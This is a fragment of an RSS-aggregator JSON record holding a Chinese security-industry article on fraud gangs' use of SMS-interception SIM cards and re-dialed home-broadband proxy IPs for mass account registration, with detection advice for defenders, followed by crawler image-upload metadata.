短信拦截卡与宽带IP成主流","link":"https://www.4hou.com/posts/GgV0","description":"<p>从业务安全的角度上来说，业务越重，防范黑产的责任也就越大，很多公司利用基础的业务风控举措去屏蔽一些黑产的作恶行为，降低自己的损失。但是，黑产仍然有办法将作恶行为进行伪装，从而实现牟利的目的。通过拦截卡与代理IP来对攻击行为进行”包装“，将黑产作恶手段隐藏其中，就是黑产近期追崇的绕过方式。</p><p><span style=\"font-size: 20px;\"><strong>1. 与真实用户共用的手机黑卡——拦截卡已成主流黑卡之一</strong></span></p><p>由于国内互联网基本上是以手机号为基础进行的用户认证，手机号资源一直是互联网黑产伪造身份环节上的必备资源。相较于以往黑产固定持有大量的手机SIM卡作恶，近期利用设备硬件后门与软件APP形式植入木马两种方式对手机进行控制利用的短信拦截卡逐渐受到了黑产的青睐。体现在黑卡比例上就是新增卡片数量已经超过了其他黑手机卡的增幅。短信拦截卡受黑产青睐的原因主要是这种手机卡具有无需养卡、与真实用户共用、不会被标记为黑产持有等特性。</p><p>通过硬件后门和软件app方式植入木马的产业链一直都存在，被控制的手机称为“野鸡、肉鸡”，该产业链已经有十多年的发展史了。在这种趋势里，控制一定规模野鸡和肉鸡的渠道团伙也不在少数，他们起初控制手机的目标是为了分发一些应用来牟利，现在则是通过利用手机号进行恶意注册，从而获得更多的利润。</p><p>短信拦截卡这种黑卡从2018年末首次被业务安全研究者发现，之后虽然遭受过来自执法部门的打击，但未打消这个行业的需求。上游“供货商”持续补充短信拦截卡的“卡源”，使得短信拦截卡在手机黑卡产业中占据了自己的一席之地。根据永安在线对短信拦截卡的监测数据，去年年初至11月，拦截卡每月增量基本都是在6万至30万之间。而从19年12月开始，当月拦截卡新增数量直线上升，这波势头在今年1月到达了顶峰，当月新增数量558万，是去年同期新增数量6.2万的90倍。结合与其他手机黑卡的比例对比，短信拦截卡已经成为了现阶段黑产集中精力开发的黑卡渠道。</p><p style=\"text-align:center\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326363102591.png\" title=\"1598326363102591.png\" alt=\"image1.png\"/></p><p><span style=\"font-size: 20px;\"><strong>2. 家庭宽带拨号类型的代理IP占比超过90%</strong></span></p><p>现阶段，代理IP仍为黑产绕过各种业务在IP层面防护的主要手段。但是随着业务安全防御层级的逐渐升级，对IP的拦截逐渐趋于严格，越来越多黑产长期持有的IP被发现并拦截。在这种情况下，黑产需要更多的IP资源去保证自己作恶行为的成功率。在寻找IP资源的时候，黑产找到了一个稳定IP来源，而且成本低廉、隐蔽性高：家用宽带拨号的IP。</p><p>电信运营商持有的IP由于数量不足以满足国内互联网的发展需求，在宽带上网拨号时分配的IP上他们进行了资源调配，这使得每一次拨号都有机会获取到一个与之前不同的IP。利用这种现状，黑产将其视作可以在短时间内租赁到大量IP的渠道进行利用。而且，由于相关IP释放后仍会分配给普通宽带用户，在各大IP数据库中也会标明其为家用宽带，不会被标记为黑产活跃使用的IP，这就避免了相关作恶行为因IP特征被屏蔽。这种黑产利用家宽拨号获取并利用的IP资源，我们一般简称其为“秒拨”IP。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326389577697.png\" title=\"1598326389577697.png\"/></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326389210281.png\" title=\"1598326389210281.png\"/></p><p style=\"text-align: center;\">秒拨IP在某些IP识别库内被识别为普通宽带，但近期有历史作恶行为</p><p>秒拨IP因其供应稳定、与其他宽带用户共用等特性，受到了黑产的一致青睐。根据永安在线安全团队通过长时间布控和研究市面上的活跃代理IP资源获得的统计数据显示，当前提供给黑产使用的代理IP日均量级在500万以上，其中秒拨型代理IP占比高达91.43%，传统型代理IP却仅占8.57%，相较于2019年的统计数据，秒拨型代理IP占比增长了16.87%。通过这些数据，我们可以知道，在代理IP的供求关系中，因其隐匿的特点，黑产对秒拨型代理IP的需求还是相对旺盛的。</p><p style=\"text-align: center\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326409190451.png\" title=\"1598326409190451.png\" alt=\"image4.png\"/></p><p style=\"text-align: center;\">秒拨型代理IP与传统型代理IP的占比比例</p><p><span style=\"font-size: 20px;\"><strong>3. 黑产工具整合作恶方法 攻击更加隐蔽</strong></span></p><p>无论是短信拦截卡，还是秒拨IP，都是从黑产作恶手段方向去讨论的。黑产实际作恶中不仅需要手段，更需要黑产工具作为提高效率的方法。作为提高黑产作恶效率的加速器，黑产工具通过整合多个作恶模块，可以方便黑产进行自动化批量攻击，减轻人力，提高效率。而通过对热门黑产工具的功能分析，我们可以了解到黑产在作恶目标与作恶手段上的趋势，从而针对性进行防范。</p><p>通过对近期恶意注册场景下的工具的分析，我们发现近期的黑产工具都是在相关业务的自动化模拟上集成了接码平台和秒拨代理IP工具，黑产利用这些工具去实现大量的账号注册，从而在平台上进行作恶。黑产还会利用工具的一些筛选功能去提高注册的成功率，以下图工具为例，黑产通过软件自带的“实卡注册”筛选功能，调用接码平台的拦截卡去注册账号，从而抵御来自平台方对黑产手机号注册关联账号的清洗。在“控制中心”中还有对代理IP拨号的相关设定，设置每一个代理IP使用几秒，注册几个账号等行为，以规避平台对单个IP注册频率限制。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326438735023.png\" title=\"1598326438735023.png\"/></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326438107127.png\" title=\"1598326438107127.png\"/></p><p>黑产工具中对代理IP与短信拦截卡的应用不止于盲目的调用，针对风控相对严格的平台，黑产还有将手机号归属地和IP归属地进行匹配的手段，通过这种方法去将黑产作恶行为进行进一步的隐藏，从而实现黑产作恶牟利的目标。</p><p style=\"text-align: center\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326467155173.png\" title=\"1598326467155173.png\" alt=\"image7.png\"/></p><p style=\"text-align: center;\">部分黑产工具可以选择指定运营商和归属地的手机号与宽带IP</p><p><span style=\"font-size: 20px;\"><strong>4. 辨别短信拦截卡和秒拨IP的方法</strong></span></p><p>面对黑产利用真人使用的手机卡进行作恶的短信拦截卡，和利用循环使用的秒拨宽带IP进行代理攻击，在应对处理上不能采用对抗黑产长期持有的黑卡黑IP的那种一刀切的方法，这时我们需要采用的方法应该是多维风控模型去进行限制。</p><p><strong>1.针对短信拦截卡的攻击，由于需要区分“是否为持卡人本人操作”，则根据拦截卡本身特点和使用拦截卡攻击过程中的特征进行判定。</strong></p><p>在IP角度发现的异常可作为黑产操纵拦截卡的辅助判定方式。例如一些开放海外注册的平台，账号本身为海外拦截卡号码，但访问来源IP却命中了国内“秒拨”黑IP，这其中存在明显的恶意特征。永安在线的IP画像具有高实时性特征，拦截卡号主使用的IP和判黑IP重叠的概率基本为0。所以命中拦截卡与命中任何类型的黑代理IP均是极其异常的账号行为的依据，可判定为恶意。</p><p>企业也可以结合自身业务场景设置行为特征的判断规则，如拉新中同一邀请码下的新用户账号中，拦截卡占比过高、出现过一定的手机黑卡、黑IP命中次数等，即可判定相关新用户账号是由黑产批量注册，而非拦截卡卡号主注册。</p><p><strong>2.针对代理IP的攻击，除了对主流黑产持有的IP进行阻断拦截，由于“秒拨”IP是由黑产和宽带用户共同使用，在通过IP特征进行判断时，需要根据其作恶时间，利用时效性去进行判断其是否为黑产进行攻击。</strong></p>","descriptionType":"text/html","publishedDate":"Tue, 25 Aug 2020 07:32:37 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326363102591.png","linkMd5":"dd7b3dd3eff4e15f8e30d58cdd7a3d00","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn39@2020_1/2020/08/25/10-01-54-616_1039d6b3432218ec.webp","destWidth":705,"destHeight":375,"sourceBytes":21336,"destBytes":24894,"author":"永安在线反欺诈","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326363102591.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn39@2020_1/2020/08/25/10-01-54-616_1039d6b3432218ec.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326389577697.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn55@2020_4/2020/08/25/10-02-01-328_489df1a98b60218f.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326389210281.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn36@2020_4/2020/08/25/10-02-06-467_d40485c8b39d1cf9.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326409190451.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn76@2020_5/2020/08/25/10-02-03-028_04be68ffcc61d5c3.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326438735023.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn91@2020_1/2020/08/25/10-02-02-122_caa7840c204a55ea.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326438107127.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn31@2020_5/2020/08/25/10-02-04-205_a8ec5aab394a8077.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326467155173.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn99@2020_6/2020/08/25/10-02-02-788_58b6b0721e64944c.webp"},"publishedOrCreatedDate":1598349711570}],"record":{"createdTime":"2020-08-25 18:01:51","updatedTime":"2020-08-25 18:01:51","feedId":6942,"fetchDate":"Tue, 25 Aug 2020 10:01:51 +0000","fetchMs":3321,"handleMs":69,"totalMs":26216,"newArticles":0,"totalArticles":20,"status":1,"type":0,"ip":"ada05755678bf4340b12baf2b7ec7640","hostName":"us-034*","requestId":"e0906165210446e9b0f070441e4de924_6942","contentType":"text/xml; charset=UTF-8","totalBytes":3735480,"bgimgsTotal":6,"bgimgsGithubTotal":6,"articlesImgsTotal":56,"articlesImgsGithubTotal":56,"successGithubMap":{"myreaderx8":2,"myreaderx14":1,"myreaderx15":2,"myreaderx7":2,"myreaderx16":2,"myreaderx6":2,"myreaderx4":2,"myreaderx10":2,"myreaderx32":2,"myreaderx11":2,"myreaderx3":2,"myreaderx33":2,"myreaderx12":2,"myreaderx2":2,"myreaderx1":2,"myreaderx13":2,"myreaderx30":1,"myreaderx31":2,"myreaderx18":2,"myreaderx19":2,"myreaderx":2,"myreaderx25":2,"myreaderx27":2,"myreaderx21":2,"myreaderx22":2,"myreaderx23":2,"myreaderx24":2,"myreaderx5oss":2,"myreaderx29":2},"failGithubMap":{}},"feed":{"createdTime":"2020-08-25 04:33:21","updatedTime":"2020-08-25 07:16:25","id":6942,"name":"嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com","url":"http://www.4hou.com/feed","subscriber":null,"website":null,"icon":"https://www.4hou.com/favicon.ico","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx65/cdn62@2020_1/2020/08/24/23-16-03-220_3d63d92d260693c0.jpg","description":"嘶吼是一家新兴的互联网安全新媒体，为您带来不一样的互联网安全新视界。嘶吼的出现将为信息安全领域带来更有力量的声音，我们的每一声嘶吼，都如雷贯耳；每一个步伐，都掷地有声！","weekly":null,"link":null},"noPictureArticleList":[],"tmpCommonImgCdnBytes":256500,"tmpBodyImgCdnBytes":3478980,"tmpBgImgCdnBytes":0,"extra4":{"start":1598349707521,"total":0,"statList":[{"spend":3994,"msg":"获取xml内容"},{"spend":69,"msg":"解释文章"},{"spend":1,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":13704,"msg":"正文链接上传到cdn"}]},"extra5":56,"extra6":56,"extra7ImgCdnFailResultVector":[],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-018.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-53.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-039.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe65.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-002.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-035.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe61.herokuapp.com/":{"failCount":0,"successCount":4,"resultList":[200,200,200,200]},"http://us-022.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-030.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-026.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-006.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe69.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe-23.herokuapp.com/":{"failCount":0,"successCount":4,"resultList":[200,200,200,200]},"http://europe-57.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-010.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-014.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326363102591.png","sourceStatusCode":200,"destWidth":705,"destHeight":375,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn39@2020_1/2020/08/25/10-01-54-616_1039d6b3432218ec.webp","sourceBytes":21336,"destBytes":24894,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3831,"convertSpendMs":12,"createdTime":"2020-08-25 18:01:51","host":"us-010*","referer":"https://www.4hou.com/posts/GgV0","linkMd5ListStr":"dd7b3dd3eff4e15f8e30d58cdd7a3d00,dd7b3dd3eff4e15f8e30d58cdd7a3d00","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"20.8 KB","destSize":"24.3 KB","compressRate":"116.7%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526447177777.png","sourceStatusCode":200,"destWidth":1106,"destHeight":566,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn31@2020_2/2020/08/25/10-01-54-972_66cf45a0d3f1d903.webp","sourceBytes":91067,"destBytes":65348,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4306,"convertSpendMs":45,"createdTime":"2020-08-25 18:01:51","host":"us-035*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975,f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"88.9 KB","destSize":"63.8 KB","compressRate":"71.8%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200412/1586663929484458.png","sourceStatusCode":200,"destWidth":751,"destHeight":303,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn36@2020_6/2020/08/25/10-01-55-363_95973d7d1cab190f.webp","sourceBytes":178270,"destBytes":16532,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4692,"convertSpendMs":23,"createdTime":"2020-08-25 18:01:51","host":"us-022*","referer":"https://www.4hou.com/posts/nNnR","linkMd5ListStr":"4df24128064db5f6005bb3a2f7b1961c,4df24128064db5f6005bb3a2f7b1961c","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"174.1 KB","destSize":"16.1 KB","compressRate":"9.3%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598348960723939.png","sourceStatusCode":200,"destWidth":926,"destHeight":544,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn19@2020_2/2020/08/25/10-01-58-456_184ba4a6608c1cc9.webp","sourceBytes":382667,"destBytes":35194,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":7633,"convertSpendMs":41,"createdTime":"2020-08-25 18:01:51","host":"us-006*","referer":"https://www.4hou.com/posts/Np6z","linkMd5ListStr":"ba9067a4276b40f16809017742c71a1c,ba9067a4276b40f16809017742c71a1c","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"373.7 KB","destSize":"34.4 KB","compressRate":"9.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597729942246461.png","sourceStatusCode":200,"destWidth":1647,"destHeight":725,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn24@2020_5/2020/08/25/10-01-58-158_b0abe49a702b4bf6.webp","sourceBytes":133616,"destBytes":83838,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":7918,"convertSpendMs":61,"createdTime":"2020-08-25 18:01:51","host":"europe69*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a,175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"130.5 KB","destSize":"81.9 KB","compressRate":"62.7%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347623177436.png","sourceStatusCode":200,"destWidth":830,"destHeight":610,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn28@2020_4/2020/08/25/10-01-58-897_5e93c5d19c3d256f.webp","sourceBytes":163538,"destBytes":30694,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":8238,"convertSpendMs":26,"createdTime":"2020-08-25 18:01:51","host":"europe-57*","referer":"https://www.4hou.com/posts/MoV3","linkMd5ListStr":"719d0e33d92b39b5ce9b86bc27274aa0,719d0e33d92b39b5ce9b86bc27274aa0","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"159.7 KB","destSize":"30 KB","compressRate":"18.8%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526456132398.png","sourceStatusCode":200,"destWidth":974,"destHeight":104,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn96@2020_5/2020/08/25/10-02-01-197_5f19d85f047769a5.webp","sourceBytes":5884,"destBytes":9450,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":1991,"convertSpendMs":19,"createdTime":"2020-08-25 18:02:00","host":"us-035*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"5.7 KB","destSize":"9.2 KB","compressRate":"160.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730308429161.png","sourceStatusCode":200,"destWidth":285,"destHeight":140,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn87@2020_1/2020/08/25/10-02-01-217_1be15763f22f8e91.webp","sourceBytes":3372,"destBytes":6642,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2059,"convertSpendMs":11,"createdTime":"2020-08-25 18:02:00","host":"europe69*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.3 KB","destSize":"6.5 KB","compressRate":"197%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598348975186870.png","sourceStatusCode":200,"destWidth":766,"destHeight":642,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn48@2020_1/2020/08/25/10-02-01-239_e14f33855bbbcad9.webp","sourceBytes":30807,"destBytes":8736,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2120,"convertSpendMs":19,"createdTime":"2020-08-25 18:02:00","host":"us-006*","referer":"https://www.4hou.com/posts/Np6z","linkMd5ListStr":"ba9067a4276b40f16809017742c71a1c","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"30.1 KB","destSize":"8.5 KB","compressRate":"28.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326389577697.png","sourceStatusCode":200,"destWidth":430,"destHeight":162,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn55@2020_4/2020/08/25/10-02-01-328_489df1a98b60218f.webp","sourceBytes":9050,"destBytes":10548,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2061,"convertSpendMs":5,"createdTime":"2020-08-25 18:02:00","host":"europe-57*","referer":"https://www.4hou.com/posts/GgV0","linkMd5ListStr":"dd7b3dd3eff4e15f8e30d58cdd7a3d00","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"8.8 KB","destSize":"10.3 KB","compressRate":"116.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526457155284.png","sourceStatusCode":200,"destWidth":2256,"destHeight":238,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn83@2020_4/2020/08/25/10-02-01-492_1fd4d12c5d684e74.webp","sourceBytes":54258,"destBytes":30622,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2307,"convertSpendMs":24,"createdTime":"2020-08-25 18:02:00","host":"us-006*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"53 KB","destSize":"29.9 KB","compressRate":"56.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526455250631.png","sourceStatusCode":200,"destWidth":2380,"destHeight":144,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn3@2020_6/2020/08/25/10-02-01-744_b5a046747bb091d8.webp","sourceBytes":33780,"destBytes":26184,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2529,"convertSpendMs":13,"createdTime":"2020-08-25 18:02:00","host":"us-010*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"33 KB","destSize":"25.6 KB","compressRate":"77.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526448135280.png","sourceStatusCode":200,"destWidth":1922,"destHeight":1148,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn100@2020_6/2020/08/25/10-02-01-705_fffa0ff0d27c8caf.webp","sourceBytes":154802,"destBytes":105916,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2719,"convertSpendMs":97,"createdTime":"2020-08-25 18:02:00","host":"us-022*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"151.2 KB","destSize":"103.4 KB","compressRate":"68.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730058794973.png","sourceStatusCode":200,"destWidth":922,"destHeight":765,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn71@2020_4/2020/08/25/10-02-02-419_887c4237904953c9.webp","sourceBytes":37150,"destBytes":50116,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3174,"convertSpendMs":23,"createdTime":"2020-08-25 18:02:00","host":"us-53*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"36.3 KB","destSize":"48.9 KB","compressRate":"134.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526456483190.png","sourceStatusCode":200,"destWidth":3818,"destHeight":578,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn68@2020_6/2020/08/25/10-02-01-954_dc9c434799c69040.webp","sourceBytes":303928,"destBytes":404618,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3192,"convertSpendMs":131,"createdTime":"2020-08-25 18:02:00","host":"us-010*","referer":"https://www.4hou.com/posts/vD7X","linkMd5ListStr":"f8690d9c234135c7e23dc40e00906975","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"296.8 KB","destSize":"395.1 KB","compressRate":"133.1%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326438735023.png","sourceStatusCode":200,"destWidth":632,"destHeight":705,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn91@2020_1/2020/08/25/10-02-02-122_caa7840c204a55ea.webp","sourceBytes":108676,"destBytes":25722,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3185,"convertSpendMs":19,"createdTime":"2020-08-25 18:02:00","host":"europe-57*","referer":"https://www.4hou.com/posts/GgV0","linkMd5ListStr":"dd7b3dd3eff4e15f8e30d58cdd7a3d00","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"106.1 KB","destSize":"25.1 KB","compressRate":"23.7%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326467155173.png","sourceStatusCode":200,"destWidth":511,"destHeight":517,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn99@2020_6/2020/08/25/10-02-02-788_58b6b0721e64944c.webp","sourceBytes":142112,"destBytes":24992,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3607,"convertSpendMs":15,"createdTime":"2020-08-25 18:02:00","host":"us-53*","referer":"https://www.4hou.com/posts/GgV0","linkMd5ListStr":"dd7b3dd3eff4e15f8e30d58cdd7a3d00","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"138.8 KB","destSize":"24.4 KB","compressRate":"17.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730117269698.png","sourceStatusCode":200,"destWidth":1152,"destHeight":716,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn36@2020_3/2020/08/25/10-02-02-647_ff2eba2a5f65489e.webp","sourceBytes":53319,"destBytes":103230,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3634,"convertSpendMs":38,"createdTime":"2020-08-25 18:02:00","host":"us-53*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"52.1 KB","destSize":"100.8 KB","compressRate":"193.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730125174723.png","sourceStatusCode":200,"destWidth":1692,"destHeight":873,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn59@2020_3/2020/08/25/10-02-02-594_1fe528c596f2c590.webp","sourceBytes":126237,"destBytes":186670,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3617,"convertSpendMs":116,"createdTime":"2020-08-25 18:02:00","host":"us-035*","referer":"https://www.4hou.com/posts/Ggr7","linkMd5ListStr":"175108e0d2314a7edc11456f658ec56a","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"123.3 KB","destSize":"182.3 KB","compressRate":"147.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598326409190451.png","sourceStatusCode":200,"destWidth":1026,"destHeight":777,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn76@2020_5/2020/08/25/10-02-03-028_04be68ffcc61d5c3.webp","sourceBytes":20533,"destBytes":23026,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3807,"convertSpendMs":22,"createdTime":"2020-08-25 18:02:00","host":"us-030*","referer":"https://www.4hou.com/posts/GgV0","linkMd5ListStr":"dd7b3dd3eff4e15f8e30d58cdd7a3d00","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"20.1 KB","destSize":"22.5 